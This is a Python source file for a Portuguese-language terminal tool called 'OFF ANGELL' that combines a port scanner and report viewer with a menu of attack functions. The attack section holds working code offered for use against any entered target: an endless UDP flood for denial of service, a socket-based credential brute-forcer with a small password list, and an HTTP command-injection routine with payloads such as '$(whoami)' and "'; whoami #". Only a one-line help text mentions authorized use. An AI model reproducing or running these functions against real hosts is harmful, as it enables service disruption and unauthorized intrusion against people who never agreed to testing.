import sys
import socket
import random
from types import SimpleNamespace
from core.validation import (
    is_web_service,
    validate_ports,
    validate_target,
)

# Importações do seu core (mantenha as pastas core/ conforme seu projeto)
try:
    from core.validation import is_web_service, validate_ports, validate_target
    from core.reports import clean_text, list_reports, new_report, now_iso, read_report, save_report
    from core.scanner import ScanError, banner_grabbing, scan_ports, vulnerability_scan
    from core.tools import dependency_status, run_nikto, run_zap
except ImportError as e:
    print(f"Erro ao importar módulos do core: {e}")
    sys.exit(1)

if sys.version_info < (3, 10):
    raise SystemExit("OFF ANGELL requer Python 3.10 ou superior.")

try:
    from colorama import Fore, init
except ImportError:
    Fore = SimpleNamespace(CYAN="", RED="", GREEN="", YELLOW="", MAGENTA="", RESET="")
    def init(**kwargs): pass

# --- FUNÇÕES DE ATAQUE ---

def execute_ddos(target: str, port: int):
    print(f"{Fore.RED}[!] Iniciando UDP Flood em {target}:{port}...")
    payload = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    try:
        while True:
            sock.sendto(payload, (target, port))
            sent += 1
            if sent % 1000 == 0:
                print(f"{Fore.GREEN}[+] Pacotes enviados: {sent}", end='\r')
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Ataque interrompido pelo usuário.")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro no ataque: {e}")

def brute_force_service(target: str, port: int):
    print(f"{Fore.RED}[!] Tentando Brute Force na porta {port} de {target}...")
    wordlist = ["admin", "root", "user", "123456", "password"]
    for user in wordlist:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            s.send(f"{user}\n".encode()) 
            response = s.recv(1024)
            if b"success" in response.lower() or b"welcome" in response.lower():
                print(f"{Fore.GREEN}[+] Senha encontrada: {user}")
                s.close()
                return True
            s.close()
        except:
            continue
    print(f"{Fore.YELLOW}[-] Nenhuma senha da wordlist funcionou.")
    return False

def attempt_rce(target: str, port: int):
    print(f"{Fore.RED}[!] Tentando Remote Code Execution (RCE) em {target}:{port}...")
    payloads = ["'; whoami #", "\" || whoami #", "$(whoami)", "admin' --"]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        for p in payloads:
            request = f"GET /?id={p} HTTP/1.1\r\nHost: {target}\r\n\r\n"
            s.send(request.encode())
            res = s.recv(1024)
            if b"root" in res or b"www-data" in res:
                print(f"{Fore.GREEN}[+] RCE Sucesso com payload: {p}")
                return True
        print(f"{Fore.YELLOW}[-] RCE falhou.")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}")

# --- UTILITÁRIOS DE INTERFACE ---

def clear_screen() -> None:
    if sys.stdout.isatty():
        print("\033[2J\033[H", end="")

def pause() -> None:
    input("\nPressione Enter para continuar...")

def print_banner() -> None:
    print(f"""
{Fore.CYAN} ██████╗ ███████╗███████╗     █████╗ ███╗   ██╗ ██████╗ ███████╗██╗     ██╗
{Fore.CYAN}██╔═══██╗██╔════╝██╔════╝    ██╔══██╗████╗  ██║██╔════╝ ██╔════╝██║     ██║
{Fore.CYAN}██║   ██║█████╗  █████╗      ███████║██╔██╗ ██║██║  ███╗█████╗  ██║     ██║
{Fore.CYAN}██║   ██║██╔══╝  ██╔══╝      ██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██║     ██║
{Fore.CYAN}╚██████╔╝██║     ██║         ██║  ██║██║ ╚████║╚██████╔╝███████╗███████╗███████╗
{Fore.CYAN} ╚═════╝ ╚═╝     ╚═╝         ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝
{Fore.RESET}
""")

def header(title: str) -> None:
    clear_screen()
    print_banner()
    print(f"{Fore.CYAN}{'=' * 60}\n{title}\n{'=' * 60}")

# --- LÓGICA DE SCAN E RELATÓRIOS ---

def show_dependencies() -> None:
    header("[ DEPENDÊNCIAS ]")
    for name, available, detail in dependency_status():
        color = Fore.GREEN if available else Fore.YELLOW
        print(f"{color}[{'OK' if available else '--'}] {name}: {detail}")
    pause()

def show_help() -> None:
    header("[ AJUDA ]")
    print("OFF ANGELL: Ferramenta de testes de segurança.\nUse apenas em ambientes autorizados.")
    pause()

def choose_scan_mode() -> tuple[str, str | None] | None:
    while True:
        header("[ MODO DE SCAN ]")
        print("[1] Scan rápido\n[2] Scan completo\n[3] Personalizado\n[4] Voltar")
        choice = input("Escolha: ").strip()
        if choice == "1": return "rápido", None
        if choice == "2": return "completo", "1-65535"
        if choice == "3":
            try:
                ports = validate_ports(input("Portas: "))
                return "personalizado", ports
            except ValueError as exc:
                print(f"{Fore.RED}[!] {exc}"); pause()
        if choice == "4": return None
        print(f"{Fore.RED}[!] Opção inválida."); pause()

def save_report_menu(report: dict) -> None:
    choice = input("Salvar como [1] TXT, [2] JSON ou [3] Voltar: ").strip()
    if choice == "3": return
    if choice in {"1", "2"}:
        try:
            path = save_report(report, "txt" if choice == "1" else "json")
            print(f"{Fore.GREEN}[+] Salvo: {path}")
        except Exception as exc:
            print(f"{Fore.RED}[!] Erro: {exc}")
    pause()

def view_reports() -> None:
    while True:
        header("[ RELATÓRIOS ]")
        paths = list_reports()
        if not paths:
            print("Nenhum relatório encontrado."); pause(); return
        for i, p in enumerate(paths): print(f"[{i}] {p.name}")
        choice = input("Índice ou 'v': ").strip()
        if choice.lower() == "v": return
        if choice.isdecimal() and int(choice) < len(paths):
            print(read_report(paths[int(choice)]))
        else:
            print(f"{Fore.RED}[!] Inválido.")
        pause()

def show_service(info: dict) -> None:
    for key, label in (("port", "Porta"), ("protocol", "Protocolo"), ("service", "Serviço"), ("product", "Produto"), ("version", "Versão")):
        print(f"{label}: {clean_text(str(info.get(key) or 'desconhecido'))}")

def analyze_port(choice: str, report: dict, info: dict) -> None:
    target = report["target"]
    port = int(info["port"])
    result = None
    try:
        if choice == "1":
            result = banner_grabbing(target, port, info)
            print(result.get("banner") or result.get("message", "Sem resposta."))
        elif choice == "2":
            result = vulnerability_scan(report.get("address", target), port)
            for name, output in result.get("scripts", {}).items():
                print(f"\n[{name}]\n{output}")
        elif choice == "3":
            if not is_web_service(info):
                print(f"{Fore.YELLOW}[!] Não é serviço web."); return
            result = run_nikto(target, port, info)
            print(result['message'])
        elif choice == "4":
            if not is_web_service(info):
                print(f"{Fore.YELLOW}[!] Não é serviço web."); return
            result = run_zap(target, port, info)
            print(result['message'])
    except Exception as exc:
        print(f"{Fore.RED}[!] Erro: {exc}")
    
    if result:
        report.setdefault("analyses", []).append(result)

def off_angel_menu(report: dict, info: dict) -> bool:
    while True:
        header("[ OFF ANGELL - PORTA ]")
        print(f"Alvo: {report['target']}\nPorta: {info['port']}\nServiço: {info['service']}")
        print("[1] Info [2] Banner [3] NSE [4] Nikto [5] ZAP [6] Salvar [7] Voltar [8] Sair")
        choice = input("Escolha: ").strip()
        if choice == "7": return False
        if choice == "8": return True
        if choice == "6": save_report_menu(report)
        elif choice == "1": show_service(info)
        elif choice in {"2", "3", "4", "5"}: analyze_port(choice, report, info)
        else: print(f"{Fore.RED}[!] Inválido.")
        pause()

def ports_menu(report: dict) -> bool:
    while True:
        header("[ PORTAS ABERTAS ]")
        print(f"Alvo: {report['target']}\n")
        if not report["open_ports"]:
            print("Nenhuma porta aberta."); pause(); return False
        for i, info in enumerate(report["open_ports"]):
            print(f"{Fore.CYAN}[{i}] {info['port']}/{info['protocol']} OPEN {info['service']}")
        print("\n[r] Salvar | [s] Voltar")
        choice = input("Escolha: ").strip()
        if choice.lower() == "s": return False
        if choice.lower() == "r": save_report_menu(report)
        elif choice.isdecimal() and int(choice) < len(report["open_ports"]):
            if off_angel_menu(report, report["open_ports"][int(choice)]): return True
        else:
            print(f"{Fore.RED}[!] Inválido."); pause()

def start_scanner() -> bool:
    header("[ NOVA ANÁLISE ]")
    try:
        target = validate_target(input("Alvo (IP/Host): "))
    except ValueError as exc:
        print(f"{Fore.RED}[!] {exc}"); pause(); return False
    selected = choose_scan_mode()
    if not selected: return False
    mode, ports = selected
    report = new_report(target, mode, ports)
    try:
        report.update(scan_ports(target, ports))
    except Exception as exc:
        report.update(status="erro", message=str(exc), finished_at=now_iso())
    return ports_menu(report)

# --- MAIN ---

def main() -> None:
    for stream in (sys.stdout, sys.stderr):
        if hasattr(stream, "reconfigure"):
            stream.reconfigure(encoding="utf-8", errors="replace")
    init(autoreset=True)

    while True:
        try:
            header("[ MENU PRINCIPAL ]")
            print(f"{Fore.CYAN}[1] Ataque DDoS (UDP Flood)")
            print(f"{Fore.CYAN}[2] Brute Force de Credenciais")
            print(f"{Fore.CYAN}[3] Tentativa de RCE / Shell Injection")
            print(f"{Fore.CYAN}[4] Scan de Vulnerabilidades (Scanner)")
            print(f"{Fore.CYAN}[5] Ver Relatórios")
            print(f"{Fore.CYAN}[6] Dependências")
            print(f"{Fore.CYAN}[7] Ajuda")
            print(f"{Fore.CYAN}[v] Sair")

            choice = input("Escolha uma opção: ").strip().lower()

            if choice in ["1", "2", "3"]:
                target = input("Alvo (IP/Domínio): ").strip()
                try:
                    port = int(input("Porta: ").strip())
                    if choice == "1": execute_ddos(target, port)
                    elif choice == "2": brute_force_service(target, port)
                    elif choice == "3": attempt_rce(target, port)
                except ValueError:
                    print(f"{Fore.RED}[!] Porta inválida.")
            elif choice == "4":
                start_scanner()
            elif choice == "5":
                view_reports()
            elif choice == "6":
                show_dependencies()
            elif choice == "7":
                show_help()
            elif choice == "v":
                print(f"\n{Fore.YELLOW}[!] OFF ANGELL encerrado.")
                return
            else:
                print(f"{Fore.RED}[!] Opção inválida.")
                pause()

        except (KeyboardInterrupt, EOFError):
            print(f"\n{Fore.YELLOW}[!] Encerrando...")
            return
        except Exception as exc:
            print(f"{Fore.RED}[!] Erro crítico: {exc}")
            pause()

if __name__ == "__main__":
    main()